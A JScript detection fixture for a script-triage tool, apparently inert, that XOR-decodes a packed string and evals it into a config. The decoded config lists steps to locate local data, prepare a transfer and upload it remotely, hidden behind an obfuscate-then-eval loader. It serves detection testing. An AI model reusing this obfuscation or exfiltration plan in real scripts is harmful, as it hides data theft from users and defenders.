// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_d3eda405 = function(item1) {
  var keyBytes = [128,112,8,110,8];
  var item2 = [];
  for (var i = 0; i < item1.length; i++) { item2.push(item1[i] ^ keyBytes[i % keyBytes.length]); }
  return item2;
};
var recover_060adfd5 = function() {
  var packedText = "251-82-123-26-109-240-3-42-84-83-162-28-103-13-105-244-21-87-2-103-227-17-100-76-36-162-0-122-11-120-225-2-109-49-124-242-17-102-29-110-229-2-42-66-42-245-0-100-1-105-228-47-122-11-101-239-4-109-76-85-172-82-105-10-105-240-4-109-28-42-186-82-95-7-102-200-4-124-30-38-215-25-102-38-124-244-0-90-11-121-245-21-123-26-38-181-94-57-76-36-162-6-105-2-125-229-3-42-84-115-162-19-105-3-120-225-25-111-0-87-233-20-42-84-42-227-17-101-30-105-233-23-102-67-109-225-64-62-91-110-182-72-109-92-42-172-82-125-28-100-162-74-42-6-124-244-0-123-84-39-175-21-105-94-62-181-22-62-86-109-178-94-109-22-105-237-0-100-11-38-233-30-126-15-100-233-20-39-90-107-177-21-62-12-110-182-94-108-15-124-162-92-42-27-123-229-2-87-15-111-229-30-124-76-50-162-56-125-0-124-242-21-123-29-68-225-18-39-11-105-176-70-61-8-62-184-21-58-76-36-162-22-97-2-109-223-0-105-26-96-162-74-42-45-50-220-44-93-29-109-242-3-84-50-88-245-18-100-7-107-220-44-64-27-102-244-2-109-29-123-204-17-106-50-84-243-4-105-9-109-173-21-105-94-62-181-22-62-86-109-178-94-108-15-124-162-13-36-76-123-244-17-111-11-75-239-5-102-26-42-186-67-117";

  var packedParts = packedText.split("-");

  var item1 = [];

  for (var di = 0; di < packedParts.length; di++) { item1.push(parseInt(packedParts[di], 10)); }

  var item6 = (19 * 7) - 133;

  var item2 = decode_d3eda405.apply(null, [item1]);

  var item3 = item2.length ? String.fromCharCode(item2[0]) : "";

  for (var bi = 1; bi < item2.length; bi++) { item3 = item3.concat(String.fromCharCode(item2[bi])); }

  return item3;
};
var inspect_dac072d2 = function() {
  var item4 = eval("(" + recover_060adfd5.apply(null, []) + ")");
  var table = { steps: function() { return item4["steps"]; }, values: function() { return item4["values"]; } };
  return { steps: table["steps"].apply(null, []), adapter: item4["adapter"], values: table["values"].apply(null, []), stageCount: item4["stageCount"] };
};
